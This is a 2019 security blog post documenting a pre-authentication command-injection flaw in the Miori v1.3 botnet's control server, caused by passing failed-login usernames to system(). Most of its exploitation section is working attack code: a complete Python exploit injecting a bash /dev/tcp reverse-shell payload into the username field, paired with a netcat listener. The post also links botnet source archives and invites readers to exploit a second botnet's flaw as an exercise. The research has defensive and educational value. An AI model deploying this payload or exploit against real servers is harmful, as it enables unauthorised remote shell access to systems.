---
layout: post
title: "Script Kiddie Nightmares:<br>Hacking Poorly Coded Botnets"
subtitle: "~ AKA, how to exploit shitty code ~"
date: 2019-08-29
author: V3ded
category: pwn 
tags: pentesting 
finished: true
---

> **DISCLAIMER**: The aim of this blog is not to offend or attack anyone. While I do admit that some of these people would highly benefit from a little discipline, please do not go and cause harm to the people referenced in the blog. I do not condone malicious behavior.  Thank you for understanding. 
<br><br>
> **DISCLAIMER**: There are some racial comments by the botnet authors which I didn't censor out. Viewer discretion is advised. 

# Preface 
As the title suggests, this post will touch on the theme of exploiting badly coded botnets, usually ones owned and operated by skids. I never really took interest in such a topic before and therefore knew very little about *the* "cool" DDoS community. That is, until recently. From my understanding there are two main botnet variants which are constantly being ripped off and modified - [Qbot](https://github.com/geniosa/qbot) and [Mirai](https://github.com/jgamblin/Mirai-Source-Code). It seems that certain people want to "improve" the base versions of the botnets and implement more advanced features such as failed logon attempts, new DoS techniques, bruteforce prevention and so forth. This enables them to "sell" spots on their botnet (meaning that people can pay to have access to the control server and boot people offline) or sell the modified botnet source altogether. 

<a href="/img/blog/pwn-hacking-botnets/compilation.jpg" target="_blank"><img src="/img/blog/pwn-hacking-botnets/compilation.jpg"></a>

Many of these abused botnets are coded in C, a language so powerful yet so dangerous that if used by untrained coders, can lead to certain disasters - such as we are about to see. Anyone with basic knowledge in binary exploitation knows that a small mistake in this language such as miscalculating a memory allocation for a buffer or using an improper format specification when calling `printf()`, can lead to some serious vulnerabilities. This blog will cover only 1 out of 3 vulnerabilities that I found in Qbot based botnets. On the bright side, it will be the most severe one. If you're disappointed with my decision and are one of these people:

<img src="/img/blog/pwn-hacking-botnets/releaseexploit.jpeg" width="500" height="400">

Then I'm sorry, but I do not wish to initiate skid wars where kids pop shells on each other's Digital Ocean servers.  

So without further ado, I discoverd a **pre-auth RCE** vulnerability in the Miori v1.3 botnet due to improper input handling and usage of the `system()` function. Let me say that again, a **PRE-AUTH remote command execution** vulnerability. Someone managed to make a big mistake when modifying the Qbot source code - maybe next time they should stick to Python ¯\\_(ツ)_/¯. 

Anyway, it would be a shame if we exploited this vulnerability to hijack the server :). 
                                                     
***

# Setting up local environment

|             | Attacker          | Botnet server          |
|-------------|-------------------|------------------------|
| **OS**          | Linux Mint 64 bit | CentOS 7 Minimal 64bit |
| **IP Address**  |     10.10.10.7    | 10.10.10.6             |
| **Port**        |         X         |  666                   |
| **Application** |         X         | Miori v1.3             |


**Downloads:**<br>
    -> [Linux Mint ISO](http://mirrors.evowise.com/linuxmint/stable/19.2/linuxmint-19.2-cinnamon-64bit.iso)<br>
    -> [CentOS 7   ISO](https://centos.org/)<br>
    -> [Miori v1.3](https://cdn-10.anonfile.com/j241vc37n5/52b0769e-1567027971/miori+v1.3+bot.zip)<br>

**Setting up** *Miori v1.3* **botnet:**<br>
    -> [Switch Miori Botnet setup](https://www.youtube.com/watch?v=znvQ-X_j4Lk) (sorry for the cringe)<br>

> **Note:** The botnet server needs to be RedHat based because the setup script uses *yum* to download dependencies.

***

# Code Auditing
Unpacking the *.zip* archive:

<img src="/img/blog/pwn-hacking-botnets/miori_unpacked.png">

The particular file of interest to us is the `cnc/cnc.c` file. This is where the main "operator" functionality for the botnet can be found, which includes the login, registration and attack functionality. Example pictures are provided below. 

Login or register:<br><br>
<img src="/img/blog/pwn-hacking-botnets/miori_connect_01.png">

Post-auth interaction:
<img src="/img/blog/pwn-hacking-botnets/miori_connect_02.png">

The overall UI is actually pretty nice, and it seems like someone definitely spent a lot of time on it. Fortunately for us they didn't spend a lot of time on the main code. I dare say it’s atrocious. Multiple oversized *char* buffers, *42 returns and 3 exits...*, horrible indentation, mix of tabs and spaces, 76 `goto` statements (in 2019... really?). And such issues in the code go on forever. I guess that's what happens when the main goal is to make cool looking UIs and to make money instead of making something reliable and **readable**. Just so you get an idea of how the code looks, feel free to click on the image below to enlarge it.

<a href="/img/blog/pwn-hacking-botnets/miori_cnc_code.png" target="_blank"><img src="/img/blog/pwn-hacking-botnets/miori_cnc_code.png"></a>
<br>

## Journey of finding an exploit
Yes, I actually tortured myself so much that I went over the core of the `cnc.c` code. It doesn't take a professional to spot that lines *793* and *794* are exploitable.  

```C
792 |   char flog[1024];
793 |   sprintf(flog,"echo \"<--->\nfailed login with cred --> %s:%s \n[victems ip] \nip --> %s \n<--->\" >> failed.txt",iffailedu,iffailedp,ipl);
794 |   system(flog);
```

![Alt Text](/img/blog/pwn-hacking-botnets/lol.gif)

Do you see it? `iffailedu` and `iffailedp` are arguments representing failed username and passwords respectively. This allows logging for failed authentication attempts. The idea itself isn't that bad but the implementation is horrible. Using a `system()` functions instead of C's file I/O functions. Why? The answer is quite simple. 

Quote from [Subby](https://securityaffairs.co/wordpress/84948/hacking/hacker-hacked-iot-botnets.html):
> *It’s obvious as to why this is happening. A large percentage of botnet operators are simply following tutorials which have spread around in the community or are accessible on YouTube to set up their botnet.*

In a less severe case a buffer overflow can occur in this section as `flog` has 1024 bytes allocated but `iffailedu` and `iffailedp` can be up to 2048 bytes. Each of these are based on the `buf` variable on *line 637* and the corresponding `strcpy()` logic below. However the juicy vulnerability is yet to come. 

***

# Exploitation 

A blind command injection is possible by escaping the `echo` command which is called in the `system()` function. Let's simplify the scenario with a username only.

```C
char data[1024];
sprintf(data,"echo \"Failed login with username %s\n\" >> failed.txt",username);
system(data);
```

If a user logs in with an invalid username (let's say *jack*), the system function runs `echo "Failed login with username jack" >> failed.txt`. 

An attacker can supply a malicious username (and any password) that will allow him to run a command of his own. This can be achieved by using input like this: `v3ded"; touch /tmp/hacked; #`. System is then forced to run `echo "Failed login with username v3ded"; touch /tmp/hacked; #" >> failed.txt`. The hashtag (`#`) acts as a comment in *bash*, effectively commenting out rest of the command. That means that our command never gets piped to **failed.txt** and never gets logged :). Hooray! Afterwards, our exploit can be easily verified by SSHing into your CentOS server and checking for the presence of our *hacked* file in the */tmp* directory. POC is attached bellow. 

![Alt Text](/img/blog/pwn-hacking-botnets/miori_poc.gif)
<br>

Operator's view:
<img src="/img/blog/pwn-hacking-botnets/view_operator.png">

This error log alerts the operator, but due to lack of proper technical knowledge I doubt most of them will understand what happened. Still, let's not leave it up to a chance and hide the error log with a `clear` command in the following section. 

## Making a reverse shell exploit with python3 
Let's start out by supplying the required imports, making a socket, and connecting it to the server-port combination we supply.
```python
import socket
import os
import sys
from time import sleep

if(len(sys.argv) != 5):
	exit("Usage:\n\tpython3 {} C2_IP C2_PORT LHOST LPORT".format(sys.argv[0]))

C2_IP   = sys.argv[1]
C2_PORT = sys.argv[2]
LHOST   = sys.argv[3]
LPORT   = sys.argv[4]

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((C2_IP, int(C2_PORT)))
```
Afterwards we need to simulate the login process. We can do that by simply sending 3 messages to the server - `login`, `username payload` and `password` respectively.

```python
CMD = "sh -i >& /dev/tcp/{}/{} 0>&1".format(LHOST, LPORT) # Payload

print("Simulating a login command.")
sock.send(bytes("login\r\n", "utf-8"))	
	
sleep(1)
print("Sending the payload.")
sock.send(bytes('user";clear; {} ;# \r\n'.format(CMD),"utf-8")) # Hiding the error output with ;clear
		
sock.send(bytes('Press F to pay respects.\r\n',"utf-8")) # Password doesn't matter
sleep(1)
```

As you can see, Bash is used in combination with `/dev/tcp/` to create a reverse shell. It's important to notice that each command send contains a carriage return (**\r**) and a new line feed (**\n**). Without the CRLF our exploit wouldn’t work.

> **Note:** CentOS doesn't come with netcat preinstalled. Have that in mind when choosing a reverse shell or attempting data exfiltration

The core of our exploit is now finished. Let's improve it just a tiny bit by adding a horrible global *try-except* and our own *netcat* listener.  

```python
#!/usr/env/python3

import socket
import os
import sys
import threading
from time import sleep

def Listen(port):
	os.system("nc -nlvp {}".format(port))

if(len(sys.argv) != 5):
	exit("Usage:\n\tpython3 {} C2_IP C2_PORT LHOST LPORT".format(sys.argv[0]))

C2_IP   = sys.argv[1]
C2_PORT = sys.argv[2]
LHOST   = sys.argv[3]
LPORT   = sys.argv[4]

CMD  = "sh -i >& /dev/tcp/{}/{} 0>&1".format(LHOST, LPORT)

try:	
	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	sock.connect((C2_IP, int(C2_PORT)))		

	print("Simulating a login command.")
	sock.send(bytes("login\r\n", "utf-8"))	
	
	sleep(1)
	print("Sending the payload.")
	sock.send(bytes('user";clear; {} ;# \r\n'.format(CMD),"utf-8"))
	
	sock.send(bytes('Press F to pay respects.\r\n',"utf-8"))
	sleep(1)
	
	t = threading.Thread(target=Listen, args=(int(sys.argv[4]),))
	t.start()

except Exception as err:
	exit(str(err))
```

Now we can execute the exploit against a botnet server! If successful, it should all look something like this:

![Alt Text](/img/blog/pwn-hacking-botnets/exploit_rce.gif)

Cool, right? Although when configured properly on a proper port, the botnet won't run as root. **But** with the default root user on various hosting providers and the fact that our skiddies copy paste commands without knowing what they do, I bet most of your shells be will *root*. 

<img src="/img/blog/pwn-hacking-botnets/wedidit.jpg">

***

# Conclusion
Thank you dearly for reading if you got this far. This blog is an unusual distraction from my regular CTF blogs, so i hope it was to your liking. I would like to thank my friend Jack for encouraging me to write this blog and the whole *\[SG\] Switch* community for making and distributing badly rewritten botnet versions. 

## Update: 
As I was writing this blog, another Qbot rip-off called *switchware* was [released](https://www.youtube.com/watch?v=3ZT1CRtvyY4). I didn't dig into the code much but there is a post-auth RCE vulnerability. It's a very tight one though, as the buffer is limited to 50 bytes and 45 are already supplied. If this blog gets enough traction I can make a second post :). If not, well, you can try to exploit it as an exercise. The exploitable code is on lines *557*,*558* and *566*. 

> **DISCLAIMER**: There are some racial comments by the botnet authors which I didn't censor out. Viewer discretion is advised. 

A quick PoC below:

![Alt Text](/img/blog/pwn-hacking-botnets/switchware_hacked.gif)

<center>Enjoy!</center>

***

# Appendix
**Miori src:** <a href="/files/pwn-hacking-botnets/Miori.zip" target="_blank"> here </a>
**Miori exploit:**<a href="/files/pwn-hacking-botnets/MioriRCE.py" target="_blank"> here </a>
<br>
**Switchware src:** <a href="/files/pwn-hacking-botnets/Switchware.zip" target="_blank"> here </a>
**Switchware exploit:** N/A (*maybe I'll make one later*)


~V3
